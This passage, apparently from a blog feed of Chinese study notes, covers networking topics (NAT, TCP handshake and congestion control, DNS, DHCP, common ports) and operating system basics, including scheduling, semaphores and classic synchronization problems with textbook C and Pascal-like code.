对内部数据进行加密，然后重新加上数据报的首部，源地址是路由器 R1 的全球地址 125.1.2.3，目的地址是路由器 R2 的全球地址 194.4.5.6。路由器 R2 收到数据报后将数据部分进行解密，恢复原来的数据报，此时目的地址为 10.2.0.3，就交付给 Y。 网络地址转换 NAT专用网内部的主机使用本地 IP 地址又想和互联网上的主机通信时，可以使用 NAT 来将本地 IP 转换为全球 IP。 在以前，NAT 将本地 IP 和全球 IP 一一对应，这种方式下拥有 n 个全球 IP 地址的专用网内最多只可以同时有 n 台主机接入互联网。为了更有效地利用全球 IP 地址，现在常用的 NAT 转换表把运输层的端口号也用上了，使得多个专用网内部的主机共用一个全球 IP 地址。使用端口号的 NAT 也叫做网络地址与端口转换 NAPT。 五、运输层*网络层只把分组发送到目的主机，但是真正通信的并不是主机而是主机中的进程。运输层提供了进程间的逻辑通信，运输层向高层用户屏蔽了下面网络层的核心细节，使应用程序看见的好像在两个运输层实体之间有一条端到端的逻辑通信信道。 UDP 和 TCP 的特点 用户数据报协议 UDP（User Datagram Protocol）是无连接的，尽最大可能交付，没有拥塞控制，面向报文（对于应用程序传下来的报文不合并也不拆分，只是添加 UDP 首部）。 传输控制协议 TCP（Transmission Control Protocol）是面向连接的，提供可靠交付，有流量控制，拥塞控制，提供全双工通信，面向字节流（把应用层传下来的报文看成字节流，把字节流组织成大小不等的数据块）。 UDP 首部格式 首部字段只有 8 个字节，包括源端口、目的端口、长度、检验和。12 字节的伪首部是为了计算检验和临时添加的。 TCP 首部格式 序号 ：用于对字节流进行编号，例如序号为 301，表示第一个字节的编号为 301，如果携带的数据长度为 100 字节，那么下一个报文段的序号应为 401。 确认号 ：期望收到的下一个报文段的序号。例如 B 正确收到 A 发送来的一个报文段，序号为 501，携带的数据长度为 200 字节，因此 B 期望下一个报文段的序号为 701，B 发送给 A 的确认报文段中确认号就为 701。 数据偏移 ：指的是数据部分距离报文段起始处的偏移量，实际上指的是首部的长度。 确认 ACK ：当 ACK=1 时确认号字段有效，否则无效。TCP 规定，在连接建立后所有传送的报文段都必须把 ACK 置 1。 同步 SYN ：在连接建立时用来同步序号。当 SYN=1，ACK=0 时表示这是一个连接请求报文段。若对方同意建立连接，则响应报文中 SYN=1，ACK=1。 终止 FIN ：用来释放一个连接，当 FIN=1 时，表示此报文段的发送方的数据已发送完毕，并要求释放运输连接。 窗口 ：窗口值作为接收方让发送方设置其发送窗口的依据。之所以要有这个限制，是因为接收方的数据缓存空间是有限的。 TCP 的三次握手 假设 A 为客户端，B 为服务器端。 首先 B 处于 LISTEN（监听）状态，等待客户的连接请求。 A 向 B 发送连接请求报文段，SYN=1，ACK=0，选择一个初始的序号 x。 B 收到连接请求报文段，如果同意建立连接，则向 A 发送连接确认报文段，SYN=1，ACK=1，确认号为 x+1，同时也选择一个初始的序号 y。 A 收到 B 的连接确认报文段后，还要向 B 发出确认，确认号为 y+1，序号为 x+1。 B 收到 A 的确认后，连接建立。 三次握手的原因 第三次握手是为了防止失效的连接请求到达服务器，让服务器错误打开连接。 失效的连接请求是指，客户端发送的连接请求在网络中滞留，客户端因为没及时收到服务器端发送的连接确认，因此就重新发送了连接请求。滞留的连接请求并不是丢失，之后还是会到达服务器。如果不进行第三次握手，那么服务器会误认为客户端重新请求连接，然后打开了连接。但是并不是客户端真正打开这个连接，因此客户端不会给服务器发送数据，这个连接就白白浪费了。 TCP 的四次挥手 以下描述不讨论序号和确认号，因为序号和确认号的规则比较简单。并且不讨论 ACK，因为 ACK 在连接建立之后都为 1。 A 发送连接释放报文段，FIN=1。 B 收到之后发出确认，此时 TCP 属于半关闭状态，B 能向 A 发送数据但是 A 不能向 B 发送数据。 当 B 要不再需要连接时，发送连接释放请求报文段，FIN=1。 A 收到后发出确认，进入 TIME-WAIT 状态，等待 2MSL 时间后释放连接。 B 收到 A 的确认后释放连接。 四次挥手的原因 客户端发送了 FIN 连接释放报文之后，服务器收到了这个报文，就进入了 CLOSE-WAIT 状态。这个状态是为了让服务器端发送还未传送完毕的数据，传送完毕之后，服务器会发送 FIN 连接释放报文。 TIME_WAIT 客户端接收到服务器端的 FIN 报文后进入此状态，此时并不是直接进入 CLOSED 状态，还需要等待一个时间计时器设置的时间 2MSL。这么做有两个理由： 确保最后一个确认报文段能够到达。如果 B 没收到 A 发送来的确认报文段，那么就会重新发送连接释放请求报文段，A 等待一段时间就是为了处理这种情况的发生。 等待一段时间是为了让本连接持续时间内所产生的所有报文段都从网络中消失，使得下一个新的连接不会出现旧的连接请求报文段。 TCP 滑动窗口 窗口是缓存的一部分，用来暂时存放字节流。发送方和接收方各有一个窗口，接收方通过 TCP 报文段中的窗口字段告诉发送方自己的窗口大小，发送方根据这个值和其它信息设置自己的窗口大小。 发送窗口内的字节都允许被发送，接收窗口内的字节都允许被接收。如果发送窗口左部的字节已经发送并且收到了确认，那么就将发送窗口向右滑动一定距离，直到左部第一个字节不是已发送并且已确认的状态；接收窗口的滑动类似，接收窗口左部字节已经发送确认并交付主机，就向右滑动接收窗口。 接收窗口只会对窗口内最后一个按序到达的字节进行确认，例如接收窗口已经收到的字节为 {31, 32, 34, 35}，其中 {31, 32} 按序到达，而 {34, 35} 就不是，因此只对字节 32 进行确认。发送方得到一个字节的确认之后，就知道这个字节之前的所有字节都已经被接收。 TCP 可靠传输TCP 使用超时重传来实现可靠传输：如果一个已经发送的报文段在超时时间内没有收到确认，那么就重传这个报文段。 一个报文段从发送再到接收到确认所经过的时间称为往返时间 RTT，加权平均往返时间 RTTs 计算如下： 超时时间 RTO 应该略大于 RTTs，TCP 使用的超时时间计算如下： 其中 RTTd 为偏差。 TCP 流量控制流量控制是为了控制发送方发送速率，保证接收方来得及接收。 接收方发送的确认报文中的窗口字段可以用来控制发送方窗口大小，从而影响发送方的发送速率。将窗口字段设置为 0，则发送方不能发送数据。 TCP 拥塞控制如果网络出现拥塞，分组将会丢失，此时发送方会继续重传，从而导致网络拥塞程度更高。因此当出现拥塞时，应当控制发送方的速率。这一点和流量控制很像，但是出发点不同。流量控制是为了让接收方能来得及接受，而拥塞控制是为了降低整个网络的拥塞程度。 TCP 主要通过四种算法来进行拥塞控制：慢开始、拥塞避免、快重传、快恢复。发送方需要维护一个叫做拥塞窗口（cwnd）的状态变量。注意拥塞窗口与发送方窗口的区别，拥塞窗口只是一个状态变量，实际决定发送方能发送多少数据的是发送方窗口。 为了便于讨论，做如下假设： 接收方有足够大的接收缓存，因此不会发生流量控制； 虽然 TCP 的窗口基于字节，但是这里设窗口的大小单位为报文段。 1. 慢开始与拥塞避免发送的最初执行慢开始，令 cwnd=1，发送方只能发送 1 个报文段；当收到确认后，将 cwnd 加倍，因此之后发送方能够发送的报文段数量为：2、4、8 … 注意到慢开始每个轮次都将 cwnd 加倍，这样会让 cwnd 增长速度非常快，从而使得发送方发送的速度增长速度过快，网络拥塞的可能也就更高。设置一个慢开始门限 ssthresh，当 cwnd &gt;= ssthresh 时，进入拥塞避免，每个轮次只将 cwnd 加 1。 如果出现了超时，则令 ssthresh = cwnd/2，然后重新执行慢开始。 2. 快重传与快恢复在接收方，要求每次接收到报文段都应该发送对已收到有序报文段的确认，例如已经接收到 M1 和 M2，此时收到 M4，应当发送对 M2 的确认。 在发送方，如果收到三个重复确认，那么可以确认下一个报文段丢失，例如收到三个 M2 ，则 M3 丢失。此时执行快重传，立即重传下一个报文段。 在这种情况下，只是丢失个别报文段，而不是网络拥塞，因此执行快恢复，令 ssthresh = cwnd/2 ，cwnd = ssthresh，注意到此时直接进入拥塞避免。 六、应用层*域名系统 DNS把主机名解析为 IP 地址。 被设计成分布式系统。 1. 层次结构一个域名由多个层次构成，从上层到下层分别为顶级域名、二级域名、三级域名以及四级域名。所有域名可以画成一颗域名树。 域名服务器可以分为以下四类： 根域名服务器：解析顶级域名； 顶级域名服务器：解析二级域名； 权限域名服务器：解析区内的域名； 本地域名服务器：也称为默认域名服务器。可以在其中配置高速缓存。 区和域的概念不同，可以在一个域中划分多个区。图 b 在域 abc.com 中划分了两个区：abc.com 和 y.abc.com 因此就需要两个权限域名服务器： 2. 解析过程主机向本地域名服务器解析的过程采用递归，而本地域名服务器向其它域名服务器解析可以使用递归和迭代两种方式。 迭代的方式下，本地域名服务器向一个域名服务器解析请求解析之后，结果返回到本地域名服务器，然后本地域名服务器继续向其它域名服务器请求解析；而递归的方式下，结果不是直接返回的，而是继续向前请求解析，最后的结果才会返回。 3. 使用的运输层协议DNS 在解析的过程使用 UDP 进行传输，因为 UDP 最大只支持 512 字节的数据，如果超过的话就需要使用 TCP 传输。 文件传输协议 FTPFTP 在运输层使用 TCP，并且需要建立两个并行的 TCP 连接：控制连接和数据连接。控制连接在整个会话期间一直保持打开，而数据连接在数据传送完毕之后就关闭。控制连接使用端口号 21，数据连接使用端口号 20。 远程终端协议 TELNETTELNET 用于登录到远程主机上，并且远程主机上的输出也会返回。 TELNET 可以适应许多计算机和操作系统的差异，例如不同操作系统系统的换行符定义。 电子邮件协议一个电子邮件系统由三部分组成：用户代理、邮件服务器以及邮件发送协议和读取协议。其中发送协议常用 SMTP，读取协议常用 POP3 和 IMAP。 1. POP3POP3 的特点是只要用户从服务器上读取了邮件，就把该邮件删除。 2. IMAPIMAP 协议中客户端和服务器上的邮件保持同步，如果不去手动删除邮件，那么服务器上的邮件也不会被删除。IMAP 这种做法可以让用户随时随地去访问服务器上的邮件。IMAP 协议也支持创建自定义的文件夹。 3. SMTPSMTP 只能发送 ASCII 码，而互联网邮件扩充 MIME 可以发送二进制文件。MIME 并没有改动或者取代 SMTP，而是增加邮件主题的结构，定义了非 ASCII 码的编码规则。 动态主机配置协议 DHCPDHCP 提供了即插即用的连网方式，用户不再需要去手动配置 IP 地址等信息。 DHCP 配置的内容不仅是 IP 地址，还包括子网掩码、默认路由器 IP 地址、域名服务器的 IP 地址。 工作方式如下：需要 IP 地址的主机广播发送 DHCP 发现报文（将目的地址置为全 1，即 255.255.255.255:67，源地址设置为全 0，即 0.0.0.0:68），DHCP 服务器收到发现报文之后，则在 IP 地址池中取一个地址，发送 DHCP 提供报文给该主机。 点对点传输 P2P把某个文件分发的所有对等集合称为一个洪流。文件的数据单元称为文件块，它的大小是固定的。一个新的对等方加入某个洪流，一开始并没有文件块，但是能够从其它对等方中逐渐地下载到一些文件块，与此同时，它也为别的对等方上传一些文件块。 每个洪流都有一个基础设施，称为追踪器。当一个对等方加入洪流时，必须向追踪器登记，并周期性地通知追踪器它仍在洪流中。可以在任何时间加入和退出某个洪流。 一个新的对等方加入洪流时，追踪器会随机从洪流中选择若干个对等方，并让新对等方与这些对等方建立连接，把这些对等方称为相邻对等方。接收和发送文件块都是在相邻对等方中进行。 当一个对等方需要很多文件块时，通过使用最稀有优先的策略来取得文件块，也就是一个文件块在相邻对等方中副本最少，那么就优先请求这个文件块。 当很多对等方向同一个对等方请求文件块时，该对等方优先选择以最高速率向其发送文件块的对等方。 P2P 是一个分布式系统，任何时候都有对等方加入或者退出。使用分布式散列表 DHT，可以查找洪流中的资源和 IP 地址映射。 Web 页面请求过程1. DHCP 配置主机信息 假设主机最开始没有 IP 地址以及其它信息，那么就需要先使用 DHCP 来获取。 主机生成一个 DHCP 请求报文，并将这个报文放入具有目的端口 67 和源端口 68 的 UDP 报文段中。 该报文段则被放入在一个具有广播 IP 目的地址(255.255.255.255) 和源 IP 地址（0.0.0.0）的 IP 数据报中。 该数据报则被放置在 MAC 帧中，该帧具有目的地址 FF:FF:FF:FF:FF:FF，将广播到与交换机连接的所有设备。 连接在交换机的 DHCP 服务器收到广播帧之后，不断地向上分解得到 IP 数据报、UDP 报文段、DHCP 请求报文，之后生成 DHCP ACK 报文，该报文包含以下信息：IP 地址、DNS 服务器的 IP 地址、默认网关路由器的 IP 地址和子网掩码。该报文被放入 UDP 报文段中，UDP 报文段有被放入 IP 数据报中，最后放入 MAC 帧中。 该帧的目的地址是请求主机的 MAC 地址，因为交换机具有自学习能力，之前主机发送了广播帧之后就记录了 MAC 地址到其转发接口的交换表项，因此现在交换机就可以直接知道应该向哪个接口发送该帧。 主机收到该帧后，不断分解得到 DHCP 报文。之后就配置它的 IP 地址、子网掩码和 DNS 服务器的 IP 地址，并在其 IP 转发表中安装默认网关。 2. ARP 解析 MAC 地址 主机通过浏览器生成一个 TCP 套接字，套接字向 HTTP 服务器发送 HTTP 请求。为了生成该套接字，主机需要知道网站的域名对应的 IP 地址。 主机生成一个 DNS 查询报文，该报文具有 53 号端口，因为 DNS 服务器的端口号是 53。 该 DNS 查询报文被放入目的地址为 DNS 服务器 IP 地址的 IP 数据报中。 该 IP 数据报被放入一个以太网帧中，该帧将发送到网关路由器。 DHCP 过程只知道网关路由器的 IP 地址，为了获取网关路由器的 MAC 地址，需要使用 ARP 协议。 主机生成一个包含目的地址为网关路由器 IP 地址的 ARP 查询报文，将该 ARP 查询报文放入一个具有广播目的地址（FF:FF:FF:FF:FF:FF）的以太网帧中，并向交换机发送该以太网帧，交换机将该帧转发给所有的连接设备，包括网关路由器。 网关路由器接收到该帧后，不断向上分解得到 ARP 报文，发现其中的 IP 地址与其接口的 IP 地址匹配，因此就发送一个 ARP 回答报文，包含了它的 MAC 地址，发回给主机。 3. DNS 解析域名 知道了网关路由器的 MAC 地址之后，就可以继续 DNS 的解析过程了。 网关路由器接收到包含 DNS 查询报文的以太网帧后，抽取出 IP 数据报，并根据转发表决定该 IP 数据报应该转发的路由器。 因为路由器具有内部网关协议（RIP、OSPF）和外部网关协议（BGP）这两种路由选择协议，因此路由表中已经配置了网关路由器到达 DNS 服务器的路由表项。 到达 DNS 服务器之后，DNS 服务器抽取出 DNS 查询报文，并在 DNS 数据库中查找待解析的域名。 找到 DNS 记录之后，发送 DNS 回答报文，将该回答报文放入 UDP 报文段中，然后放入 IP 数据报中，通过路由器反向转发回网关路由器，并经过以太网交换机到达主机。 4. HTTP 请求页面 有了 HTTP 服务器的 IP 地址之后，主机就能够生成 TCP 套接字，该套接字将用于向 Web 服务器发送 HTTP GET 报文。 在生成 TCP 套接字之前，必须先与 HTTP 服务器进行三次握手来建立连接。生成一个具有目的端口 80 的 TCP SYN 报文段，并向 HTTP 服务器发送该报文段。 HTTP 服务器收到该报文段之后，生成 TCP SYNACK 报文段，发回给主机。 连接建立之后，浏览器生成 HTTP GET 报文，并交付给 HTTP 服务器。 HTTP 服务器从 TCP 套接字读取 HTTP GET 报文，生成一个 HTTP 响应报文，将 Web 页面内容放入报文主体中，发回给主机。 浏览器收到 HTTP 响应报文后，抽取出 Web 页面内容，之后进行渲染，显示 Web 页面。 常用端口 应用 应用层协议 端口号 运输层协议 备注 域名解析 DNS 53 UDP/TCP 长度超过 512 字节时使用 TCP 动态主机配置协议 DHCP 67/68 UDP 简单网络管理协议 SNMP 161/162 UDP 文件传送协议 FTP 20/21 TCP 控制连接 21，数据连接 20 远程终端协议 TELNET 23 TCP 超文本传送协议 HTTP 80 TCP 简单邮件传送协议 SMTP 25 TCP 邮件读取协议 POP3 110 TCP 网际报文存取协议 IMAP 143 TCP 参考资料 计算机网络, 谢希仁 JamesF.Kurose, KeithW.Ross, 库罗斯, 等. 计算机网络: 自顶向下方法 [M]. 机械工业出版社, 2014. Tackling emissions targets in Tokyo What does my ISP know when I use Tor? Technology-Computer Networking[1]-Computer Networks and the Internet P2P 网络概述. Circuit Switching (a) Circuit switching. (b) Packet switching.]]></content>
      <categories>
        <category>系统运维</category>
        <category>Network</category>
      </categories>
      <tags>
        <tag>ops</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[计算机操作系统基础知识]]></title>
    <url>%2Flinux_ops%2Fcomputer-operating-system%2F</url>
    <content type="text"><![CDATA[一、概述 操作系统基本特征 操作系统基本功能 系统调用 大内核和微内核 中断分类 二、进程管理 进程与线程 进程状态的切换 调度算法 进程同步 经典同步问题 进程通信 三、死锁 死锁的必要条件 死锁的处理方法 四、内存管理 虚拟内存 分页与分段 分页系统地址映射 页面置换算法 五、设备管理 磁盘调度算法 六、链接 编译系统 目标文件 静态链接 动态链接 参考资料 一、概述操作系统基本特征1. 并发并发是指宏观上在一段时间内能同时运行多个程序，而并行则指同一时刻能运行多个指令。 并行需要硬件支持，如多流水线或者多处理器。 操作系统通过引入进程和线程，使得程序能够并发运行。 2. 共享共享是指系统中的资源可以被多个并发进程共同使用。 有两种共享方式：互斥共享和同时共享。 互斥共享的资源称为临界资源，例如打印机等，在同一时间只允许一个进程访问，需要用同步机制来实现对临界资源的访问。 3. 虚拟虚拟技术把一个物理实体转换为多个逻辑实体。 主要有两种虚拟技术：时分复用技术和空分复用技术。例如多个进程能在同一个处理器上并发执行使用了时分复用技术，让每个进程轮流占有处理器，每次只执行一小个时间片并快速切换。 4. 异步异步指进程不是一次性执行完毕，而是走走停停，以不可知的速度向前推进。 操作系统基本功能1. 进程管理进程控制、进程同步、进程通信、死锁处理、处理机调度等。 2. 内存管理内存分配、地址映射、内存保护与共享、内存扩充等。 3. 文件管理文件存储空间的管理、目录管理、文件读写管理和保护等。 4. 设备管理完成用户的 I/O 请求，方便用户使用各种设备，并提高设备的利用率。 主要包括缓冲管理、设备分配、设备处理、虛拟设备等。 系统调用如果一个进程在用户态需要使用内核态的功能，就进行系统调用从而陷入内核，由操作系统代为完成。 Linux 的系统调用主要有以下这些： Task Commands 进程控制 fork(); exit(); wait(); 进程通信 pipe(); shmget(); mmap(); 文件操作 open(); read(); write(); 设备操作 ioctl(); read(); write(); 信息维护 getpid(); alarm(); sleep(); 安全 chmod(); umask(); chown(); 大内核和微内核1. 大内核大内核是将操作系统功能作为一个紧密结合的整体放到内核。 由于各模块共享信息，因此有很高的性能。 2. 微内核由于操作系统不断复杂，因此将一部分操作系统功能移出内核，从而降低内核的复杂性。移出的部分根据分层的原则划分成若干服务，相互独立。 在微内核结构下，操作系统被划分成小的、定义良好的模块，只有微内核这一个模块运行在内核态，其余模块运行在用户态。 因为需要频繁地在用户态和核心态之间进行切换，所以会有一定的性能损失。 中断分类1. 外中断由 CPU 执行指令以外的事件引起，如 I/O 结束中断，表示设备输入/输出处理已经完成，处理器能够发送下一个输入/输出请求。此外还有时钟中断、控制台中断等。 2. 异常由 CPU 执行指令的内部事件引起，如非法操作码、地址越界、算术溢出等。 3. 陷入在用户程序中使用系统调用。 二、进程管理进程与线程1. 进程进程是资源分配的基本单位。 进程控制块 (Process Control Block, PCB) 描述进程的基本信息和运行状态，所谓的创建进程和撤销进程，都是指对 PCB 的操作。 下图显示了 4 个程序创建了 4 个进程，这 4 个进程可以并发地执行。 2. 线程线程是独立调度的基本单位。 一个进程中可以有多个线程，它们共享进程资源。 3. 区别 拥有资源：进程是资源分配的基本单位，但是线程不拥有资源，线程可以访问隶属进程的资源。 调度：线程是独立调度的基本单位，在同一进程中，线程的切换不会引起进程切换，从一个进程内的线程切换到另一个进程中的线程时，会引起进程切换。 系统开销：由于创建或撤销进程时，系统都要为之分配或回收资源，如内存空间、I/O 设备等，所付出的开销远大于创建或撤销线程时的开销。类似地，在进行进程切换时，涉及当前执行进程 CPU 环境的保存及新调度进程 CPU 环境的设置，而线程切换时只需保存和设置少量寄存器内容，开销很小。 通信方面：进程间通信 (IPC) 需要进程同步和互斥手段的辅助，以保证数据的一致性。而线程间可以通过直接读/写同一进程中的数据段（如全局变量）来进行通信。 举例：QQ 和浏览器是两个进程，浏览器进程里面有很多线程，例如 HTTP 请求线程、事件响应线程、渲染线程等等，线程的并发执行使得在浏览器中点击一个新链接从而发起 HTTP 请求时，浏览器还可以响应用户的其它事件。 进程状态的切换 就绪状态（ready）：等待被调度 运行状态（running） 阻塞状态（waiting）：等待资源 应该注意以下内容： 只有就绪态和运行态可以相互转换，其它的都是单向转换。就绪状态的进程通过调度算法从而获得 CPU 时间，转为运行状态；而运行状态的进程，在分配给它的 CPU 时间片用完之后就会转为就绪状态，等待下一次调度。 阻塞状态是缺少需要的资源从而由运行状态转换而来，但是该资源不包括 CPU 时间，缺少 CPU 时间会从运行态转换为就绪态。 调度算法需要针对不同环境来讨论调度算法。 1. 批处理系统中的调度1.1 先来先服务 first-come first-serverd（FCFS） 调度最先进入就绪队列的作业。 有利于长作业，但不利于短作业，因为短作业必须一直等待前面的长作业执行完毕才能执行，而长作业又需要执行很长时间，造成了短作业等待时间过长。 1.2 短作业优先 shortest job first（SJF） 调度估计运行时间最短的作业。 长作业有可能会饿死，处于一直等待短作业执行完毕的状态。因为如果一直有短作业到来，那么长作业永远得不到调度。 1.3 最短剩余时间优先 shortest remaining time next（SRTN） 2. 交互式系统中的调度2.1 优先级调度除了可以手动赋予优先权之外，还可以把响应比作为优先权，这种调度方式叫做高响应比优先调度算法。 响应比 = (等待时间 + 要求服务时间) / 要求服务时间 = 响应时间 / 要求服务时间 这种调度算法主要是为了解决短作业优先调度算法长作业可能会饿死的问题，因为随着等待时间的增长，响应比也会越来越高。 2.2 时间片轮转将所有就绪进程按 FCFS 的原则排成一个队列，每次调度时，把 CPU 时间分配给队首进程，该进程可以执行一个时间片。当时间片用完时，由计时器发出时钟中断，调度程序便停止该进程的执行，并将它送往就绪队列的末尾，同时继续把 CPU 时间分配给队首的进程。 时间片轮转算法的效率和时间片的大小有很大关系。因为进程切换都要保存进程的信息并且载入新进程的信息，如果时间片太小，会导致进程切换得太频繁，在进程切换上就会花过多时间。 2.3 多级反馈队列 如果一个进程需要执行 100 个时间片，如果采用轮转调度算法，那么需要交换 100 次。多级队列是为这种需要连续执行多个时间片的进程考虑，它设置了多个队列，每个队列时间片大小都不同，例如 1,2,4,8,..。进程在第一个队列没执行完，就会被移到下一个队列。这种方式下，之前的进程只需要交换 7 次。 每个队列优先权也不同，最上面的优先权最高。因此只有上一个队列没有进程在排队，才能调度当前队列上的进程。 3. 实时系统中的调度实时系统要求一个服务请求在一个确定时间内得到响应。 分为硬实时和软实时，前者必须满足绝对的截止时间，后者可以容忍一定的超时。 进程同步1. 临界区对临界资源进行访问的那段代码称为临界区。 为了互斥访问临界资源，每个进程在进入临界区之前，需要先进行检查。 123// entry section// critical section;// exit section 2. 同步与互斥 同步：多个进程按一定顺序执行； 互斥：多个进程在同一时刻只有一个进程能进入临界区。 3. 信号量信号量（Semaphore）是一个整型变量，可以对其执行 down 和 up 操作，也就是常见的 P 和 V 操作。 down : 如果信号量大于 0 ，执行 -1 操作；如果信号量等于 0，进程睡眠，等待信号量大于 0； up ：对信号量执行 +1 操作，唤醒睡眠的进程让其完成 down 操作。 down 和 up 操作需要被设计成原语，不可分割，通常的做法是在执行这些操作的时候屏蔽中断。 如果信号量的取值只能为 0 或者 1，那么就成为了 互斥量（Mutex） ，0 表示临界区已经加锁，1 表示临界区解锁。 12345678910111213typedef int semaphore;semaphore mutex = 1;void P1() &#123; down(&amp;mutex); // 临界区 up(&amp;mutex);&#125;void P2() &#123; down(&amp;mutex); // 临界区 up(&amp;mutex);&#125; 使用信号量实现生产者-消费者问题 问题描述：使用一个缓冲区来保存物品，只有缓冲区没有满，生产者才可以放入物品；只有缓冲区不为空，消费者才可以拿走物品。 因为缓冲区属于临界资源，因此需要使用一个互斥量 mutex 来控制对缓冲区的互斥访问。 为了同步生产者和消费者的行为，需要记录缓冲区中物品的数量。数量可以使用信号量来进行统计，这里需要使用两个信号量：empty 记录空缓冲区的数量，full 记录满缓冲区的数量。其中，empty 信号量是在生产者进程中使用，当 empty 不为 0 时，生产者才可以放入物品；full 信号量是在消费者进程中使用，当 full 信号量不为 0 时，消费者才可以取走物品。 注意，不能先对缓冲区进行加锁，再测试信号量。也就是说，不能先执行 down(mutex) 再执行 down(empty)。如果这么做了，那么可能会出现这种情况：生产者对缓冲区加锁后，执行 down(empty) 操作，发现 empty = 0，此时生产者睡眠。消费者不能进入临界区，因为生产者对缓冲区加锁了，也就无法执行 up(empty) 操作，empty 永远都为 0，那么生产者和消费者就会一直等待下去，造成死锁。 123456789101112131415161718192021222324252627#define N 100typedef int semaphore;semaphore mutex = 1;semaphore empty = N;semaphore full = 0;void producer() &#123; while(TRUE)&#123; int item = produce_item(); down(&amp;empty); down(&amp;mutex); insert_item(item); up(&amp;mutex); up(&amp;full); &#125;&#125;void consumer() &#123; while(TRUE)&#123; down(&amp;full); down(&amp;mutex); int item = remove_item(); up(&amp;mutex); up(&amp;empty); consume_item(item); &#125;&#125; 4. 管程使用信号量机制实现的生产者消费者问题需要客户端代码做很多控制，而管程把控制的代码独立出来，不仅不容易出错，也使得客户端代码调用更容易。 c 语言不支持管程，下面的示例代码使用了类 Pascal 语言来描述管程。示例代码的管程提供了 insert() 和 remove() 方法，客户端代码通过调用这两个方法来解决生产者-消费者问题。 1234567891011121314monitor ProducerConsumer integer i; condition c; procedure insert(); begin // ... end; procedure remove(); begin // ... end;end monitor; 管程有一个重要特性：在一个时刻只能有一个进程使用管程。进程在无法继续执行的时候不能一直占用管程，否者其它进程永远不能使用管程。 管程引入了 条件变量 以及相关的操作：wait() 和 signal() 来实现同步操作。对条件变量执行 wait() 操作会导致调用进程阻塞，把管程让出来给另一个进程持有。signal() 操作用于唤醒被阻塞的进程。 使用管程实现生成者-消费者问题 123456789101112131415161718192021222324252627282930313233343536373839404142// 管程monitor ProducerConsumer condition full, empty; integer count := 0; condition c; procedure insert(item: integer); begin if count = N then wait(full); insert_item(item); count := count + 1; if count = 1 then signal(empty); end; function remove: integer; begin if count = 0 then wait(empty); remove = remove_item; count := count - 1; if count = N -1 then signal(full); end;end monitor;// 生产者客户端procedure producerbegin while true do begin item = produce_item; ProducerConsumer.insert(item); endend;// 消费者客户端procedure consumerbegin while true do begin item = ProducerConsumer.remove; consume_item(item); endend; 经典同步问题生产者和消费者问题前面已经讨论过了。 1. 读者-写者问题允许多个进程同时对数据进行读操作，但是不允许读和写以及写和写操作同时发生。 一个整型变量 count 记录在对数据进行读操作的进程数量，一个互斥量 count_mutex 用于对 count 加锁，一个互斥量 data_mutex 用于对读写的数据加锁。 1234567891011121314151617181920212223242526typedef int semaphore;semaphore count_mutex = 1;semaphore data_mutex = 1;int count = 0;void reader() &#123; while(TRUE) &#123; down(&amp;count_mutex); count++; if(count == 1) down(&amp;data_mutex); // 第一个读者需要对数据进行加锁，防止写进程访问 up(&amp;count_mutex); read(); down(&amp;count_mutex); count--; if(count == 0) up(&amp;data_mutex); up(&amp;count_mutex); &#125;&#125;void writer() &#123; while(TRUE) &#123; down(&amp;data_mutex); write(); up(&amp;data_mutex); &#125;&#125; 2. 哲学家进餐问题 五个哲学家围着一张圆桌，每个哲学家面前放着食物。哲学家的生活有两种交替活动：吃饭以及思考。当一个哲学家吃饭时，需要先拿起自己左右两边的两根筷子，并且一次只能拿起一根筷子。 下面是一种错误的解法，考虑到如果所有哲学家同时拿起左手边的筷子，那么就无法拿起右手边的筷子，造成死锁。 123456789101112#define N 5void philosopher(int i) &#123; while(TRUE) &#123; think(); take(i); // 拿起左边的筷子 take((i+1)%N); // 拿起右边的筷子 eat(); put(i); put((i+1)%N); &#125;&#125; 为了防止死锁的发生，可以设置两个条件： 必须同时拿起左右两根筷子； 只有在两个邻居都没有进餐的情况下才允许进餐。 123456789101112131415161718192021222324252627282930313233343536373839404142#define N 5#define LEFT (i + N - 1) % N // 左邻居#define RIGHT (i + 1) % N // 右邻居#define THINKING 0#define HUNGRY 1#define EATING 2typedef int semaphore;int state[N]; // 跟踪每个哲学家的状态semaphore mutex = 1; // 临界区的互斥semaphore s[N]; // 每个哲学家一个信号量void philosopher(int i) &#123; while(TRUE) &#123; think(); take_two(i); eat(); put_tow(i); &#125;&#125;void take_two(int i) &#123; down(&amp;mutex); state[i] = HUNGRY; test(i); up(&amp;mutex); down(&amp;s[i]);&#125;void put_tow(i) &#123; down(&amp;mutex); state[i] = THINKING; test(LEFT); test(RIGHT); up(&amp;mutex);&#125;void test(i) &#123; // 尝试拿起两把筷子 if(state[i] == HUNGRY &amp;&amp; state[LEFT] != EATING &amp;&amp; state[RIGHT] !=EATING) &#123; state[i] = EATING; up(&amp;s[i]); &#125;&#125; 进程通信1. 进程同步与进程通信的区别 进程同步：控制多个进程按一定顺序执行； 进程通信：进程间传输信息。 进程通信是一种手段，而进程同步是一种目的。也可以说，为了能够达到进程同步的目的，需要让进程进行通信，传输一些进程同步所需要的信息。 在进程同步中介绍的信号量也属于进程通信的一种方式，但是属于低级别的进程通信，因为它传输的信息非常小。 2. 进程通信方式2.1 消息传递操作系统提供了用于通信的通道（Channel），进程可以通过读写这个通道进行通信。 （一）管道 写进程在管道的尾端写入数据，读进程在管道的首端读出数据。管道提供了简单的流控制机制，进程试图读空管道时，在有数据写入管道前，进程将一直阻塞。同样地，管道已经满时，进程再试图写管道，在其它进程从管道中移走数据之前，写进程将一直阻塞。 Linux 中管道通过空文件实现。 管道有三种： 普通管道：有两个限制，一是只能单向传输；二是只能在父子进程之间使用； 流管道：去除第一个限制，支持双向传输； 命名管道：去除第二个限制，可以在不相关进程之间进行通信。 （二）消息队列 消息队列克服了信号传递信息少、管道只能承载无格式字节流以及缓冲区大小受限等缺点。 （三）套接字 套接字也是一种进程间通信机制，与其它通信机制不同的是，它可用于不同机器间的进程通信。 2.2 共享内存操作系统建立一块共享内存，并将其映射到每个进程的地址空间上，进程就可以直接对这块共享内存进行读写。 共享内存是最快的进程通信方式。 三、死锁死锁的必要条件 互斥：每个资源要么已经分配给了一个进程，要么就是可用的。 占有和等待：已经得到了某个资源的进程可以再请求新的资源。 不可抢占：已经分配给一个进程的资源不能强制性地被抢占，它只能被占有它的进程显式地释放。 环路等待：有两个或者两个以上的进程组成一条环路，该环路中的每个进程都在等待下一个进程所占有的资源。 死锁的处理方法1. 鸵鸟策略把头埋在沙子里，假装根本没发生问题。 